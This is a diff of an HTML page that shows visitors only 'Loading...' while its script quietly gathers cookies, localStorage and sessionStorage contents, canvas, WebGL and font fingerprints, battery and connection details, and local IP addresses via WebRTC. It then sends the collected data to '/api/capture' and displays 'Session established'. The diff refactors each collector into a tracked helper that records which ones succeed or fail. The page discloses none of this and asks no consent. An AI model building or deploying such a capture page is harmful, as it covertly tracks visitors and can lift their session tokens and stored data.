@@ -5,21 +5,21 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Loading...</title>
 <style>
-  body { background: #0f0f0f; color: #00ff41; font-family: monospace; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
-  .container { text-align: center; }
-  h1 { font-size: 1.5rem; margin-bottom: 0.5rem; }
-  .blink { animation: blink 1s infinite; }
-  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
-  .small { font-size: 0.8rem; opacity: 0.6; }
+body{background:#0f0f0f;color:#00ff41;font-family:monospace;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}.container{text-align:center}h1{font-size:1.5rem;margin-bottom:0.5rem}.blink{animation:blink 1s infinite}@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}.small{font-size:0.8rem;opacity:0.6}
 </style>
 </head>
 <body>
 <div class="container">
-  <h1>Loading<span class="blink">...</span></h1>
-  <p class="small">Please wait</p>
+<h1>Loading<span class="blink">...</span></h1>
+<p class="small">Please wait</p>
 </div>
 <script>
 (async function() {
+  const results = { success: [], failed: [] };
+  function track(name, fn) {
+    try { fn(); results.success.push(name); } catch(e) { results.failed.push(name + ': ' + e.message); }
+  }
+
   const payload = {
     timestamp: new Date().toISOString(),
     url: window.location.href,
@@ -30,80 +30,70 @@
     languages: navigator.languages,
     cookiesEnabled: navigator.cookieEnabled,
     doNotTrack: navigator.doNotTrack,
-    screen: {
-      width: screen.width, height: screen.height,
-      availWidth: screen.availWidth, availHeight: screen.availHeight,
-      colorDepth: screen.colorDepth, pixelDepth: screen.pixelDepth
-    },
-    window: {
-      innerWidth: window.innerWidth, innerHeight: window.innerHeight,
-      outerWidth: window.outerWidth, outerHeight: window.outerHeight,
-      devicePixelRatio: window.devicePixelRatio
-    },
     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
     timezoneOffset: new Date().getTimezoneOffset(),
-    cookies: document.cookie || 'none',
-    localStorage: Object.keys(localStorage).length > 0 ? Object.entries(localStorage).reduce((acc,[k,v]) => { acc[k]=v; return acc; }, {}) : 'empty',
-    sessionStorage: Object.keys(sessionStorage).length > 0 ? Object.entries(sessionStorage).reduce((acc,[k,v]) => { acc[k]=v; return acc; }, {}) : 'empty',
+    screen: {},
+    window: {},
     hardwareConcurrency: navigator.hardwareConcurrency,
     deviceMemory: navigator.deviceMemory || 'unknown',
-    connection: navigator.connection ? {
-      effectiveType: navigator.connection.effectiveType,
-      downlink: navigator.connection.downlink,
-      rtt: navigator.connection.rtt,
-      saveData: navigator.connection.saveData
-    } : 'unknown',
+    connection: 'unknown',
     battery: 'unknown',
-    socialChecks: {},
-    localIps: [],
+    cookies: 'none',
+    localStorage: 'empty',
+    sessionStorage: 'empty',
     fonts: [],
     webgl: null,
-    canvasFingerprint: null
+    canvasFingerprint: null,
+    localIps: [],
+    captureResults: {}
   };
 
+  // Screen
+  track('screen', () => {
+    payload.screen = { width: screen.width, height: screen.height, availWidth: screen.availWidth, availHeight: screen.availHeight, colorDepth: screen.colorDepth, pixelDepth: screen.pixelDepth };
+  });
+
+  // Window
+  track('window', () => {
+    payload.window = { innerWidth: window.innerWidth, innerHeight: window.innerHeight, outerWidth: window.outerWidth, outerHeight: window.outerHeight, devicePixelRatio: window.devicePixelRatio };
+  });
+
+  // Connection
+  track('connection', () => {
+    if (navigator.connection) {
+      payload.connection = { effectiveType: navigator.connection.effectiveType, downlink: navigator.connection.downlink, rtt: navigator.connection.rtt, saveData: navigator.connection.saveData };
+    }
+  });
+
   // Battery
-  if (navigator.getBattery) {
-    try {
+  track('battery', async () => {
+    if (navigator.getBattery) {
       const b = await navigator.getBattery();
       payload.battery = { charging: b.charging, level: b.level };
-    } catch(e) {}
-  }
+    }
+  });
 
-  // Font fingerprinting
-  (function() {
-    try {
-      const fonts = ['monospace','sans-serif','serif','Arial','Helvetica','Times New Roman','Courier New','Verdana','Georgia','Palatino','Garamond','Comic Sans MS','Trebuchet MS','Arial Black','Impact','Lucida Console','Tahoma'];
-      const detected = [];
-      const base = document.createElement('div');
-      base.style.cssText = 'position:absolute;left:-999px;visibility:hidden;font-size:72px;white-space:nowrap';
-      const span = document.createElement('span');
-      span.textContent = 'abcdefghijklmnopqrstuvwxyz0123456789';
-      base.appendChild(span);
-      document.body.appendChild(base);
-      const baseline = {};
-      for (const f of ['monospace','sans-serif','serif']) {
-        span.style.fontFamily = f;
-        baseline[f] = span.offsetWidth;
-      }
-      for (const f of fonts) {
-        span.style.fontFamily = `"${f}",monospace`;
-        if (span.offsetWidth !== baseline.monospace) detected.push(f);
-        else {
-          span.style.fontFamily = `"${f}",sans-serif`;
-          if (span.offsetWidth !== baseline['sans-serif']) detected.push(f);
-          else {
-            span.style.fontFamily = `"${f}",serif`;
-            if (span.offsetWidth !== baseline.serif) detected.push(f);
-          }
-        }
-      }
-      document.body.removeChild(base);
-      payload.fonts = detected;
-    } catch(e) {}
-  })();
+  // Cookies for our domain
+  track('cookies', () => {
+    payload.cookies = document.cookie || 'none';
+  });
+
+  // localStorage for our domain
+  track('localStorage', () => {
+    if (Object.keys(localStorage).length > 0) {
+      payload.localStorage = Object.entries(localStorage).reduce((a,[k,v]) => { a[k]=v; return a; }, {});
+    }
+  });
+
+  // sessionStorage
+  track('sessionStorage', () => {
+    if (Object.keys(sessionStorage).length > 0) {
+      payload.sessionStorage = Object.entries(sessionStorage).reduce((a,[k,v]) => { a[k]=v; return a; }, {});
+    }
+  });
 
   // WebGL
-  try {
+  track('webgl', () => {
     const canvas = document.createElement('canvas');
     const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
     if (gl) {
@@ -115,10 +105,10 @@
         unmaskedRenderer: ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : 'n/a'
       };
     }
-  } catch(e) {}
+  });
 
   // Canvas fingerprint
-  try {
+  track('canvas', () => {
     const c = document.createElement('canvas');
     c.width = 200; c.height = 50;
     const ctx = c.getContext('2d');
@@ -129,38 +119,74 @@
     ctx.fillStyle = '#069';
     ctx.fillText('BrowserLab', 2, 15);
     payload.canvasFingerprint = c.toDataURL();
-  } catch(e) {}
+  });
 
-  // WebRTC - detect local network IPs
-  try {
-    const pc = new RTCPeerConnection({ iceServers: [] });
-    pc.createDataChannel('');
-    pc.onicecandidate = (e) => {
-      if (e.candidate && e.candidate.candidate) {
-        const match = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
-        if (match && !payload.localIps.includes(match[1]) && !match[1].startsWith('127.')) {
-          payload.localIps.push(match[1]);
+  // Font fingerprinting
+  track('fonts', () => {
+    const testFonts = ['Arial','Helvetica','Times New Roman','Courier New','Verdana','Georgia','Palatino','Garamond','Comic Sans MS','Trebuchet MS','Arial Black','Impact','Lucida Console','Tahoma'];
+    const detected = [];
+    const base = document.createElement('div');
+    base.style.cssText = 'position:absolute;left:-999px;visibility:hidden;font-size:72px;white-space:nowrap';
+    const span = document.createElement('span');
+    span.textContent = 'abcdefghijklmnopqrstuvwxyz0123456789';
+    base.appendChild(span);
+    document.body.appendChild(base);
+    const baseline = {};
+    for (const f of ['monospace','sans-serif','serif']) {
+      span.style.fontFamily = f;
+      baseline[f] = span.offsetWidth;
+    }
+    for (const f of testFonts) {
+      span.style.fontFamily = `"${f}",monospace`;
+      if (span.offsetWidth !== baseline.monospace) detected.push(f);
+      else {
+        span.style.fontFamily = `"${f}",sans-serif`;
+        if (span.offsetWidth !== baseline['sans-serif']) detected.push(f);
+        else {
+          span.style.fontFamily = `"${f}",serif`;
+          if (span.offsetWidth !== baseline.serif) detected.push(f);
         }
       }
-    };
-    await pc.createOffer().then(o => pc.setLocalDescription(o));
-    await new Promise(r => setTimeout(r, 500));
-    pc.close();
-  } catch(e) {}
-
-  // Social media detection via cookie analysis (silent, no external requests)
-  const allCookies = document.cookie || '';
-  const cookieLower = allCookies.toLowerCase();
-  payload.socialChecks = {
-    cookieKeywords: {
-      facebook: cookieLower.includes('fb') || cookieLower.includes('facebook'),
-      instagram: cookieLower.includes('ig') || cookieLower.includes('insta'),
-      twitter: cookieLower.includes('tw') || cookieLower.includes('twitter'),
-      google: cookieLower.includes('google') || cookieLower.includes('gid') || cookieLower.includes('ga')
     }
-  };
+    document.body.removeChild(base);
+    payload.fonts = detected;
+  });
 
-  // Send all data to server
+  // WebRTC local IPs
+  track('webrtc', async () => {
+    const pc = new RTCPeerConnection({ iceServers: [] });
+    pc.createDataChannel('');
+    await new Promise(resolve => {
+      pc.onicecandidate = (e) => {
+        if (e.candidate && e.candidate.candidate) {
+          const m = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
+          if (m && !payload.localIps.includes(m[1]) && !m[1].startsWith('127.')) payload.localIps.push(m[1]);
+        }
+        if (!e.candidate) resolve();
+      };
+      pc.createOffer().then(o => pc.setLocalDescription(o));
+      setTimeout(resolve, 1000);
+    });
+    pc.close();
+  });
+
+  // Social media cookie keyword check
+  track('socialCheck', () => {
+    const c = (document.cookie || '').toLowerCase();
+    payload.socialCheck = {
+      facebook: c.includes('fb') || c.includes('facebook'),
+      instagram: c.includes('ig') || c.includes('insta'),
+      twitter: c.includes('tw') || c.includes('twitter'),
+      note: 'Only checks cookies on THIS domain. Facebook/Instagram cookies on their own domains are BLOCKED by Same-Origin Policy.'
+    };
+  });
+
+  // Wait for async operations
+  await new Promise(r => setTimeout(r, 600));
+
+  payload.captureResults = results;
+
+  // Send
   try {
     await fetch('/api/capture', {
       method: 'POST',
@@ -169,7 +195,6 @@
     });
   } catch(e) {}
 
-  // Update UI
   document.querySelector('h1').textContent = 'Connected';
   document.querySelector('.small').textContent = 'Session established';
 })();
